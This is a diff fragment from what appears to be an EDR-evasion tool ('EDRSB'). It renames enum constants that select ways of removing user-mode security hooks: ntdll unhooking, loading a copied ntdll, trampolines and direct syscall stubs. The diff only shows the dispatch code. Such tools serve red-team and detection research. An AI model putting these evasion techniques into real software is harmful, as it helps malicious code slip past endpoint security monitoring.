@@ -519,11 +519,11 @@ VOID Usermode_EnumAllMonitoring(_Inout_ EDRSB_CONTEXT* ctx) {
 
 VOID Usermode_RemoveAllMonitoring(_Inout_ EDRSB_CONTEXT* ctx, EDRSB_USERMODE_TECHNIQUE technique) {
     UNHOOK_METHOD map_methods[5] = { 0 }; //maps EDRSB_USERMODE_TECHNIQUE enum with UNHOOK_METHOD enum
-    map_methods[Unhook_with_ntdll_NtProtectVirtualMemory] = UNHOOK_WITH_NTPROTECTVIRTUALMEMORY;
-    map_methods[Copy_ntdll_and_load] = UNHOOK_WITH_DUPLICATE_NTPROTECTVIRTUALMEMORY;
-    map_methods[Allocate_trampoline] = UNHOOK_WITH_INHOUSE_NTPROTECTVIRTUALMEMORY_TRAMPOLINE;
-    map_methods[Find_and_use_existing_trampoline] = UNHOOK_WITH_EDR_NTPROTECTVIRTUALMEMORY_TRAMPOLINE;
-    map_methods[Use_direct_syscall] = UNHOOK_WITH_DIRECT_SYSCALL;
+    map_methods[EDRSB_UMTECH_Unhook_with_ntdll_NtProtectVirtualMemory] = UNHOOK_WITH_NTPROTECTVIRTUALMEMORY;
+    map_methods[EDRSB_UMTECH_Copy_ntdll_and_load] = UNHOOK_WITH_DUPLICATE_NTPROTECTVIRTUALMEMORY;
+    map_methods[EDRSB_UMTECH_Allocate_trampoline] = UNHOOK_WITH_INHOUSE_NTPROTECTVIRTUALMEMORY_TRAMPOLINE;
+    map_methods[EDRSB_UMTECH_Find_and_use_existing_trampoline] = UNHOOK_WITH_EDR_NTPROTECTVIRTUALMEMORY_TRAMPOLINE;
+    map_methods[EDRSB_UMTECH_Use_direct_syscall] = UNHOOK_WITH_DIRECT_SYSCALL;
     UNHOOK_METHOD unhook_method = map_methods[technique];
 
     if (!ctx->foundUserlandHooks) {
@@ -552,17 +552,17 @@ EDRSB_STATUS _GetSafeNtFunctionbyUnhookingWithNtProtectVirtualMemory(_In_ LPCSTR
 EDRSB_STATUS Usermode_GetSafeNtFunc(_Inout_ EDRSB_CONTEXT* ctx, _In_ LPCSTR functionName, _Outptr_result_maybenull_ PVOID* function, EDRSB_USERMODE_TECHNIQUE technique) {
     WCHAR tempDLLFilePath[MAX_PATH] = { 0 };
     switch (technique) {
-    case Copy_ntdll_and_load:
+    case EDRSB_UMTECH_Copy_ntdll_and_load:
         GetTempPathW(MAX_PATH, tempDLLFilePath);
         PathCchCombine(tempDLLFilePath, _countof(tempDLLFilePath), tempDLLFilePath, L"ntdlol.txt");//TODO : make it configurable
         return _Usermode_GetSafeNtFunction_with_ntdll_copy(ctx, tempDLLFilePath, functionName, function);
-    case Allocate_trampoline:
+    case EDRSB_UMTECH_Allocate_trampoline:
         return _GetSafeNtFunctionUsingTrampoline(FALSE, functionName, function);
-    case Find_and_use_existing_trampoline:
+    case EDRSB_UMTECH_Find_and_use_existing_trampoline:
         return _GetSafeNtFunctionUsingTrampoline(TRUE, functionName, function);
-    case Unhook_with_ntdll_NtProtectVirtualMemory:
+    case EDRSB_UMTECH_Unhook_with_ntdll_NtProtectVirtualMemory:
         return _GetSafeNtFunctionbyUnhookingWithNtProtectVirtualMemory(functionName, function);
-    case Use_direct_syscall:
+    case EDRSB_UMTECH_Use_direct_syscall:
         *function = CreateSyscallStubWithVirtuallAlloc(functionName);
         if (*function) {
             return EDRSB_SUCCESS;
